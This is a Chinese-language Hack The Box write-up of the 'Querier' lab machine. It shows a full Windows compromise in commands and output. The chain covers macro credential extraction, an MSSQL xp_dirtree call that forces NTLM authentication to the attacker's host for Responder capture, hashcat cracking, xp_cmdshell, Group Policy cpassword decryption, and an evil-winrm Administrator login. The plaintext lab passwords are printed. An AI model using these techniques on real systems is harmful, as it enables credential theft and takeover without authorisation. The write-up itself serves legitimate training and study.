---
title: HTB-Querier Writeup
date: 2026-09-30T14:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - HTB
  - Writeup
  - Windows
  - SMB
  - MSSQL
  - Impacket
  - NTLM
---
## Nmap 扫描

用 nmap 扫描开放的端口。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Querier]
└─$ sudo nmap --min-rate 10000 -p- 10.129.46.204 -oA Nmap/ports
[sudo] password for kali:
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-29 22:07 -0400
Warning: 10.129.46.204 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.46.204
Host is up (0.15s latency).
Not shown: 65475 closed tcp ports (reset), 46 filtered tcp ports (no-response)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1433/tcp  open  ms-sql-s
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.44 seconds
┌──(kali㉿kali)-[~/Work/Kali/Querier]
└─$ grep open Nmap/ports.nmap | awk -F '/' '{print $1}' | paste -sd ','
135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669,49670,49671
```

对存活的端口进行详细信息扫描。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Querier]
└─$ sudo nmap -sT -sC -sV -O -p135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669,49670,49671 10.129.46.204 -oA Nmap/detail
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-29 22:11 -0400
Nmap scan report for 10.129.46.204
Host is up (0.11s latency).

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-09-30T02:03:56
|_Not valid after:  2056-09-30T02:03:56
| ms-sql-ntlm-info:
|   10.129.46.204:1433:
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: QUERIER
|     DNS_Domain_Name: HTB.LOCAL
|     DNS_Computer_Name: QUERIER.HTB.LOCAL
|     DNS_Tree_Name: HTB.LOCAL
|_    Product_Version: 10.0.17763
|_ssl-date: 2026-09-30T02:11:36+00:00; -57s from scanner time.
| ms-sql-info:
|   10.129.46.204:1433:
|     Version:
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2019 (96%), Microsoft Windows Server 2016 (95%), Microsoft Windows 10 (93%), Microsoft Windows 10 1709 - 21H2 (93%), Microsoft Windows 10 21H1 (93%), Microsoft Windows Server 2022 (93%), Microsoft Windows 10 1903 (92%), Microsoft Windows Server 2012 (92%), Windows Server 2019 (92%), Microsoft Windows Longhorn (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-09-30T02:11:28
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
|_clock-skew: mean: -57s, deviation: 0s, median: -58s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.93 seconds
```

将暴露出来的域名解析进 `/etc/hosts`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Querier]
└─$ tail -n 1 /etc/hosts
10.129.46.204 QUERIER.HTB.LOCAL HTB.LOCAL HTB
```

## smb 探索

nxc 匿名会话没能列举出共享。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Querier]
└─$ nxc smb 10.129.46.204 -u '' -p '' --shares
SMB         10.129.46.204   445    QUERIER          [*] Windows 10 / Server 2019 Build 17763 x64 (name:QUERIER) (domain:HTB.LOCAL) (signing:False) (SMBv1:None) (Null Auth:True)
SMB         10.129.46.204   445    QUERIER          [+] HTB.LOCAL\:
SMB         10.129.46.204   445    QUERIER          [-] Error enumerating shares: STATUS_ACCESS_DENIED
┌──(kali㉿kali)-[~/Work/Kali/Querier]
└─$ nxc smb 10.129.46.204 -u 'enil' -p '' --shares
SMB         10.129.46.204   445    QUERIER          [*] Windows 10 / Server 2019 Build 17763 x64 (name:QUERIER) (domain:HTB.LOCAL) (signing:False) (SMBv1:None) (Null Auth:True)
SMB         10.129.46.204   445    QUERIER          [-] Connection Error: The NETBIOS connection with the remote host timed out.
```

换成 smbclient 列出了共享文件夹，有一个非默认文件夹 `Reports`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Querier]
└─$ smbclient -N -L //10.129.46.204

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Reports         Disk
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.46.204 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

连接上取，发现一个 xlsm 文件，下载到 kali 本地。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Querier]
└─$ smbclient -N //10.129.46.204/Reports
Try "help" to get a list of possible commands.
smb: \> prompt off
smb: \> recurse on
smb: \> ls
  .                                   D        0  Mon Jan 28 18:23:48 2019
  ..                                  D        0  Mon Jan 28 18:23:48 2019
  Currency Volume Report.xlsm         A    12229  Sun Jan 27 17:21:34 2019

		5158399 blocks of size 4096. 850149 blocks available
smb: \> mget *
getting file \Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (24.7 KiloBytes/sec) (average 24.7 KiloBytes/sec)
smb: \> exit
┌──(kali㉿kali)-[~/Work/Kali/Querier]
└─$ file Currency\ Volume\ Report.xlsm
Currency Volume Report.xlsm: Microsoft Excel 2007+
```

## xlsm 探索

用 olevba 把宏源码抠出来，连接串和密码就写在里面。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Querier]
└─$ olevba "Currency Volume Report.xlsm"
olevba 0.60.2 on Python 3.13.12 - http://decalage.info/python/oletools
===============================================================================
FILE: Currency Volume Report.xlsm
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls
in file: xl/vbaProject.bin - OLE stream: 'VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

' macro to pull data for client volume reports
'
' further testing required

Private Sub Connect()

Dim conn As ADODB.Connection
Dim rs As ADODB.Recordset

Set conn = New ADODB.Connection
conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"
conn.ConnectionTimeout = 10
conn.Open

If conn.State = adStateOpen Then

  ' MsgBox "connection successful"

  'Set rs = conn.Execute("SELECT * @@version;")
  Set rs = conn.Execute("SELECT * FROM volume;")
  Sheets(1).Range("A1").CopyFromRecordset rs
  rs.Close

End If

End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls
in file: xl/vbaProject.bin - OLE stream: 'VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
```

```bash
Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6
```

## mssql

用 mssqlclient 连接上 `reporting`，注意这里 SQL 认证是关的，所以要加 `-windows-auth` 走 NTLM。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Querier]
└─$ impacket-mssqlclient 'reporting:PcwTWTHRwryjc$c6'@10.129.46.204 -windows-auth
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2017 RTM (14.0.1000)
[!] Press help for extra shell commands
SQL (QUERIER\reporting  reporting@volume)> SELECT @@version;
                                                                                                                                                                                                                              
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) 
        Aug 22 2017 17:04:49 
        Copyright (C) 2017 Microsoft Corporation
        Standard Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
   
SQL (QUERIER\reporting  reporting@volume)> SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');
        
-   -   
0   0   
SQL (QUERIER\reporting  reporting@volume)> SELECT name FROM master.dbo.sysdatabases;
name     
------   
master   
tempdb   
model    
msdb     
volume
```

reporting 不是 sysadmin，先确认能调用 `xp_` 系列拓展过程。

```bash
SQL (QUERIER\reporting  reporting@volume)> EXEC master..xp_fileexist 'C:\Windows\win.ini';
File Exists   File is a Directory   Parent Directory Exists   
-----------   -------------------   -----------------------   
          1                     0                         1 
```

```bash
SQL (QUERIER\reporting  reporting@volume)> EXEC master..xp_dirtree '\\10.10.16.151\share';
username                       
----------------------------   
QUERIER\reporting  reporting 
```

另起一个终端 Responder，再让 SQL Server 去访问一个不存在的 UNC 路径，他会用服务账户的身份发起一次 SMB 认证。

```bash
[SMB] NTLMv2-SSP Client   : 10.129.46.204
[SMB] NTLMv2-SSP Username : QUERIER\mssql-svc
[SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:e276281452bdd8e9:3BCA85DF2DE83B282CE7D1DAD1B074AD:01010000000000008034FCE76450DD01BD24FC52FBF9DAC200000000020008003800550054005A0001001E00570049004E002D005400370030003700430038004500590054003600490004003400570049004E002D00540037003000370043003800450059005400360049002E003800550054005A002E004C004F00430041004C00030014003800550054005A002E004C004F00430041004C00050014003800550054005A002E004C004F00430041004C00070008008034FCE76450DD010600040002000000080030003000000000000000000000000030000091AAD0BA6DBE3D6A3002055E6C5E4F273DAD8C7B4312128A59987980DB6DBCAD0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310036002E00310035003100000000000000000000000000
[*] Skipping previously captured hash for QUERIER\mssql-svc
[*] Skipping previously captured hash for QUERIER\mssql-svc

```

用 hashcat 爆破出来密码为 `corporate568`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Querier]
└─$ sudo hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-10.129.46.204.txt /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-13th Gen Intel(R) Core(TM) i9-13900HX, 13929/27859 MB (4096 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 3 digests; 3 unique digests, 3 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 514 MB (25953 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

MSSQL-SVC::QUERIER:7e7f65d2e549e510:5389cf72e5acaa3ef4a0a20e62e34d2d:01010000000000008034fce76450dd0164050a86137bcec100000000020008003800550054005a0001001e00570049004e002d005400370030003700430038004500590054003600490004003400570049004e002d00540037003000370043003800450059005400360049002e003800550054005a002e004c004f00430041004c00030014003800550054005a002e004c004f00430041004c00050014003800550054005a002e004c004f00430041004c00070008008034fce76450dd010600040002000000080030003000000000000000000000000030000091aad0ba6dbe3d6a3002055e6c5e4f273dad8c7b4312128a59987980db6dbcad0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310036002e00310035003100000000000000000000000000:corporate568
MSSQL-SVC::QUERIER:e276281452bdd8e9:3bca85df2de83b282ce7d1dad1b074ad:01010000000000008034fce76450dd01bd24fc52fbf9dac200000000020008003800550054005a0001001e00570049004e002d005400370030003700430038004500590054003600490004003400570049004e002d00540037003000370043003800450059005400360049002e003800550054005a002e004c004f00430041004c00030014003800550054005a002e004c004f00430041004c00050014003800550054005a002e004c004f00430041004c00070008008034fce76450dd010600040002000000080030003000000000000000000000000030000091aad0ba6dbe3d6a3002055e6c5e4f273dad8c7b4312128a59987980db6dbcad0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310036002e00310035003100000000000000000000000000:corporate568
MSSQL-SVC::QUERIER:1f9058ac106cc5ea:353bf363bd7fbbb2dab6869f1ead0a8d:01010000000000008034fce76450dd01c692efe306abf2b100000000020008003800550054005a0001001e00570049004e002d005400370030003700430038004500590054003600490004003400570049004e002d00540037003000370043003800450059005400360049002e003800550054005a002e004c004f00430041004c00030014003800550054005a002e004c004f00430041004c00050014003800550054005a002e004c004f00430041004c00070008008034fce76450dd010600040002000000080030003000000000000000000000000030000091aad0ba6dbe3d6a3002055e6c5e4f273dad8c7b4312128a59987980db6dbcad0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310036002e00310035003100000000000000000000000000:corporate568

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: /usr/share/responder/logs/SMB-NTLMv2-SSP-10.129.46.204.txt
Time.Started.....: Tue Sep 29 23:05:11 2026 (6 secs)
Time.Estimated...: Tue Sep 29 23:05:17 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  4555.1 kH/s (1.26ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 3/3 (100.00%) Digests (total), 3/3 (100.00%) Digests (new), 3/3 (100.00%) Salts
Progress.........: 26886144/43033155 (62.48%)
Rejected.........: 0/26886144 (0.00%)
Restore.Point....: 8953856/14344385 (62.42%)
Restore.Sub.#01..: Salt:2 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: cosmin123 -> coreyr1
Hardware.Mon.#01.: Util: 68%

Started: Tue Sep 29 23:05:10 2026
Stopped: Tue Sep 29 23:05:19 2026
```

将凭据保存下来。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Querier]
└─$ cat mssql-svc
mssql-svc:corporate568
```

用 mssql-svc 登陆上 mssqlclient，发现身份是 sysadmin。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Querier]
└─$ impacket-mssqlclient 'mssql-svc:corporate568'@10.129.46.204 -windows-auth
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'master'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2017 RTM (14.0.1000)
[!] Press help for extra shell commands
SQL (QUERIER\mssql-svc  dbo@master)> SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');
        
-   -   
1   1
```

打开 `xp_cmdshell`，命令执行落到 mssql-svc 身份上。

```bash
SQL (QUERIER\mssql-svc  dbo@master)> enable_xp_cmdshell
INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (QUERIER\mssql-svc  dbo@master)> xp_cmdshell whoami
output              
-----------------   
querier\mssql-svc   
NULL
```

翻到本机缓存的组策略首选项，里面有一个 `Groups.xml`。

```bash
SQL (QUERIER\mssql-svc  dbo@master)> enable_xp_cmdshell
INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (QUERIER\mssql-svc  dbo@master)> xp_cmdshell dir /s /b "C:\ProgramData\Microsoft\Group Policy\History"
output                                                                             
--------------------------------------------------------------------------------   
C:\ProgramData\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}   
C:\ProgramData\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine   
C:\ProgramData\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences   
C:\ProgramData\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups   
C:\ProgramData\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml   
NULL                                                                               
SQL (QUERIER\mssql-svc  dbo@master)> xp_cmdshell dir /s /b \\QUERIER\SYSVOL\HTB.LOCAL\Policies
output                              
---------------------------------   
The network name cannot be found.   
NULL
```

读取出来发现 administrator 的 cpassword。

```bash
SQL (QUERIER\mssql-svc  dbo@master)> xp_cmdshell type "C:\ProgramData\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml"
output                                                                             
--------------------------------------------------------------------------------   
<?xml version="1.0" encoding="UTF-8" ?><Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">   
<User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="Administrator" image="2" changed="2019-01-28 23:12:48" uid="{CD450F70-CDB8-4948-B908-F8D038C59B6C}" userContext="0" removePolicy="0" policyApplied="1">   
<Properties action="U" newName="" fullName="" description="" cpassword="CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ" changeLogon="0" noChange="0" neverExpires="1" acctDisabled="0" userName="Administrator"></Prope   
rties></User></Groups>
```

解密出来密码。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Querier]
└─$ echo 'CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 00000000000000000000000000000000 | iconv -f utf-16le
MyUnclesAreMarioAndLuigi!!1!                                                                                                                                            
```

用 evil-winrm 连接上拿到 administrator。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Querier]
└─$ evil-winrm -i 10.129.46.204 -u Administrator -p 'MyUnclesAreMarioAndLuigi!!1!'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
querier\administrator
```